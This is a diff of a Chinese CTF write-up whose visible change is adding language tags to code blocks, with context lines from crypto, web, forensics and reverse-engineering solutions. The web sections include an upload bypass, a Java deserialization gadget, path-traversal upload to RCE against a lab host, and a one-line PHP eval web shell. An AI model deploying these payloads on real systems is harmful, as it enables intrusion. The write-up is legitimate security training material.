@@ -544,7 +544,7 @@ print(bytes.fromhex(hex(m)[2:]))
 
 根据题目条件，2^e=y(modn)，所以可以直接分解2^e-y，得到比较大的就是p，大小在16位附近的就是q；最后利用威尔逊定理处理一下模同余就行。
 
-```
+```python
 import gmpy2
 
 y=4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377
@@ -572,7 +572,7 @@ print(bytes.fromhex(hex(m)[2:]))
 
 多传一个文件 用 分块来传输 
 
-```
+```http
 POST / HTTP/1.1
 Content-type: multipart/form-data; boundary=--------------------------55split
 User-Agent: Firefox
@@ -617,7 +617,7 @@ php://filter/read=convert.base64-encode/resource=flag.php
 
 可以尝试调用SignedObject的getobject二次反序列化
 
-```
+```java
 final Object templates = Gadgets.createTemplatesImpl(command);
 // mock method name until armed
 final BeanComparator comparator = new BeanComparator("lowestSetBit");
@@ -700,7 +700,7 @@ dirsearch 扫描发现 .git 利用 githacker 下载源码
 
 bypass 登陆
 
-```
+```http
 GET /login.php HTTP/1.1
 Host: 192.168.1.116
 Upgrade-Insecure-Requests: 1
@@ -714,7 +714,7 @@ Connection: close
 
 授权 RCE
 
-```
+```http
 POST /navigate_upload.php?session_id=5b62jp0rgrcqc8e337c0pnv7o4&engine=picnik&id=....//....//....//navigate_info.php HTTP/1.1
 Host: 192.168.1.116
 Pragma: no-cache
@@ -743,7 +743,7 @@ system("ls -al");
 
 用 注释中的内容 RCE 反弹 Shell 触发 RCE
 
-```
+```http
 POST /navigate_info.php HTTP/1.1
 Host: 192.168.1.116
 Upgrade-Insecure-Requests: 1
@@ -768,7 +768,7 @@ cmd=ls
 
 发现 假 flag
 
-```
+```bash
 cat flag
 a48,a35,a44,a91,a19,a65,a21,a69,a69,a67,a13,a18,a20,a65,a21,a13,a19,a23,a65,a69,a13,a20,a67,a17,a18,a13,a25,a17,a65,a69,a17,a68,a19,a19,a68,a18,a65,a17,a93
 ```
@@ -777,7 +777,7 @@ a48,a35,a44,a91,a19,a65,a21,a69,a69,a67,a13,a18,a20,a65,a21,a13,a19,a23,a65,a69,
 
 逆向后 发现需要去掉 bocai 文件   然后进行删除
 
-```
+```bash
 lsattr
 ---------------- ./cache
 ---------------- ./cfg
@@ -880,7 +880,7 @@ dirsearch 扫描发现phpmyadmin，口令root，password到了后台
 
 通过puts跨目录写shell到static/upload/下
 
-```
+```php
 <?php fputs(fopen('../shell.php','w'),'<?php @eval($_POST["cmd"])?');?>
 ```
 
@@ -910,7 +910,7 @@ filescan发现secret.jpg
 
 简单处理下
 
-```
+```python
 a=open('1.zip','rb')
 b=a.read()[::-1]
 c=open('2.zip','wb')
@@ -951,7 +951,7 @@ c.write(b)
 
 因此开始爆破png宽高,得到flag
 
-```
+```python
 import zlib
 import struct
 # 同时爆破宽度和高度
@@ -995,7 +995,7 @@ with open(filename, 'rb') as f:
 
 这里用sysdir把记录导出成txt分析
 
-```
+```bash
 sysdig -r flag2.scap > 1.txt
 ```
 
@@ -1025,7 +1025,7 @@ PCL{1555a651a13ec074ce725383214fd7cc}
 
 ![](image29.png)
 
-```
+```python
 import datetime
 timestamp = 132995782594427750 #132995786261823536
 value = datetime.datetime (1601, 1, 1) + datetime.timedelta(seconds=timestamp/10000000) ### combine str 3 and 4
@@ -1041,7 +1041,7 @@ print(value.strftime('%Y-%m-%d %H:%M:%S'))
 
 ### baby_re
 
-```
+```python
 key = [0x00000056, 0x00000057, 0x00000058, 0x00000059]
 key[0] ^= 0x47
 key[1] ^= 0x32
@@ -1060,7 +1060,7 @@ flag
 
 根据vm的opcode解析伪汇编指令，如下所示。
 
-```
+```text
 user input
 convert input to bytearray
 mov tmp[0], input[0]      
@@ -1192,7 +1192,7 @@ index >= 374
 
 首先检查输入格式，长度37，{}中有32个字符，之后按16进制转换为字节序列，再对转换得到的16个字节进行校验，用z3求解即可。脚本如下。
 
-```
+```python
 from z3 import *   
 
 flag = ''
@@ -1250,14 +1250,14 @@ if __name__ == "__main__":
 
 换表base64    dump出maps和box
 
-```
+```text
 Maps = bytearray(b'XiIzDuAoGlaK6JcjM3g/9YQmHBOsxn1hLZ4w7Tt0PV5pNqUFC+rE2dSfyvWe8kRb=')
 sbox = [0x33, 0x34, 0x2C, 0x36, 0x1D, 0x12, 0x1E, 0x0C, 0x1A, 0x3C, 0x29, 0x10, 0x20, 0x14, 0x3D, 0x3B, 0x19, 0x08, 0x0E, 0x1F, 0x30, 0x05, 0x38, 0x03, 0x11, 0x1B, 0x17, 0x21, 0x2E, 0x04, 0x18, 0x23, 0x2B, 0x02, 0x27, 0x37, 0x1C, 0x24, 0x39, 0x3F, 0x35, 0x2D, 0x26, 0x13, 0x2A, 0x0A, 0x00, 0x07, 0x3E, 0x01, 0x28, 0x2F, 0x32, 0x22, 0x0D, 0x06, 0x25, 0x3A, 0x09, 0x0F, 0x16, 0x0B, 0x15, 0x31, 0x0C, 0x2C, 0x0D, 0x21, 0x22, 0x09, 0x02, 0x39, 0x31, 0x17, 0x1A, 0x33, 0x06, 0x24, 0x10, 0x04, 0x1B, 0x0B, 0x34, 0x12, 0x38, 0x27, 0x0E, 0x20, 0x2B, 0x2E, 0x00, 0x13, 0x3E, 0x3A, 0x05, 0x1E, 0x36, 0x08, 0x32, 0x29, 0x19, 0x23, 0x3D, 0x3B, 0x3C, 0x3F, 0x37, 0x30, 0x18, 0x16, 0x35, 0x25, 0x0A, 0x2D, 0x28, 0x26, 0x15, 0x11, 0x07, 0x1D, 0x2A, 0x0F, 0x1F, 0x14, 0x01, 0x1C, 0x03, 0x2F, 0x13, 0x0D, 0x35, 0x31, 0x07, 0x11, 0x1B, 0x23, 0x0B, 0x0C, 0x10, 0x25, 0x2B, 0x21, 0x33, 0x18, 0x27, 0x29, 0x02, 0x2F, 0x28, 0x30, 0x0E, 0x19, 0x3C, 0x08, 0x34, 0x20, 0x3D, 0x2E, 0x05, 0x15, 0x2C, 0x1C, 0x36, 0x22, 0x1E, 0x24, 0x38, 0x0A, 0x3F, 0x1A, 0x04, 0x26, 0x16, 0x2A, 0x3A, 0x1F, 0x2D, 0x32, 0x06, 0x37, 0x03, 0x3B, 0x00, 0x17, 0x1D, 0x12, 0x09, 0x01, 0x3E, 0x39, 0x0F, 0x14, 0x00, 0x00, 0x00, 0x3F, 0xFB, 0x7F, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0xFB, 0x7F, 0x00, 0x00, 0x6B, 0x73, 0x50, 0x68, 0x53, 0x2F, 0x33, 0x34, 0x4D, 0x58, 0x69, 0x66, 0x6A, 0x2B, 0x49, 0x62, 0x74, 0x6A, 0x75, 0x64, 0x32, 0x54, 0x69, 0x6B, 0x6A, 0x35, 0x48, 0x6B, 0x41, 0x37, 0x69, 0x54, 0x70, 0x62, 0x61, 0x4E, 0x45, 0x4C, 0x42, 0x65, 0x62, 0x4F, 0x61, 0x49, 0x6D, 0x00, 0x00, 0x00]
 ```
 
 base64之后的加密
 
-```
+```python
 box1 = sbox[0:64]
 box2 = sbox[64:128]
 box3 = sbox[128:192]
@@ -1283,7 +1283,7 @@ out
 
 逆推
 
-```
+```python
 box1 = sbox[0:64]
 box2 = sbox[64:128]
 box3 = sbox[128:192]
@@ -1324,7 +1324,7 @@ print(base64.b64decode(btext).decode())
 
 import structure
 
-```
+```c
 typedef struct TreeNode {
     struct TreeNode* parant;
     struct TreeNode* left;
@@ -1379,7 +1379,7 @@ typedef struct {
 
 调起来整个链子create struct 拿到首末address xref逆推
 
-```
+```python
 import idaapi
 import idc
 
